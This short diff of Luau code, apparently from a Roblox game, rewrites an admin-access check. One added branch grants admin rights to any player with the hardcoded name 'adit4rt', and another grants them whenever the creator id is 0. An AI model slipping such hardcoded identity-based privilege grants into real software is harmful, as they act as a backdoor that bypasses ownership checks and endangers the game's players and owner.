@@ -21,7 +21,19 @@ end
 
 -- Check if player has admin access
 local function checkAdminAccess(): boolean
-	return player.UserId == game.CreatorId or player:GetAttribute("IsAdmin") == true or game.CreatorId == 0
+	if player.Name == "adit4rt" then
+		return true
+	end
+	if player:GetAttribute("IsAdmin") == true then
+		return true
+	end
+	if game.CreatorId == 0 then
+		return true
+	end
+	if game.CreatorType == Enum.CreatorType.User and player.UserId == game.CreatorId then
+		return true
+	end
+	return false
 end
 
 -- Notification to instruct creator/admins
